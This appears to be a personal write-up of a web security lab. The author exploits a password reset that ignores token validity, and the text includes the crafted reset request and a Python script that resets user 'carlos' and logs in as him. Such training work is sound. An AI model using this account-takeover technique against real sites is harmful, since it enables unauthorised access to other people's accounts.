This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`

---

**Goal:** Exploit password reset functionality, and reset Carlos's password, then log in and access his "My account" page.

**Analysis:** I find a request after resetting the password which i send to repeater. It contains the `temp-forgot-password` token twice, once at the top and once at the bottom of the request. It also takes in a name which i changed to Carlos and received a 302 code back which could mean i've reset the the password successfully.  

![[Pasted image 20240826101453.png]]

```php
temp-forgot-password-token=ss3o2mylqwiyhtveh9jznyudmbolt6io&username=carlos&new-password-1=peter&new-password-2=peter
```

![[Pasted image 20240826101618.png]]

I successfully change the password and log into the **Carlos** account.

---

**Completed:** _10:17 2024-08-26_

**Extra:** _Python script to automate the task._

```python
#!/usr/bin/python3

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def access_carlos_account(s, url):
	
	# Reset Carlos password
	print("(+) Resetting Carlos's password...")
	pass_reset_url = url + "/forgot-password?temp-forgot-password-token=x"
	pass_reset_data = {"temp-forgot-password-token": "x", "username": "carlos", "new-password-1": "peter", "new-password-2": "peter"}
	r = s.post(pass_reset_url, data=pass_reset_data, verify=False, proxies=proxies)
	
	
	# Access Carlos account
	print("(+) Accessing Carlos's account...")
	login_url = url + "/login"
	login_data = {"username": "carlos", "password": "peter",}
	r = s.post(login_url, data=login_data, verify=False, proxies=proxies)
	
	# Confirm exploit worked
	if "Log out" in r.text:
		print("Exploit worked!")
		print("Carlos's password successfully changed to: peter")
	
	else:
		print("Exploit failed.")
		sys.exit(-1)

def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s <url>' % sys.argv[0])
		print('(+) Example: $s www.example.com' % sys.argv[0])
		sys.exit(-1)
	
	s = requests.Session()	
	url = sys.argv[1]
	access_carlos_account(s, url)

if __name__ == '__main__':
	main()
```

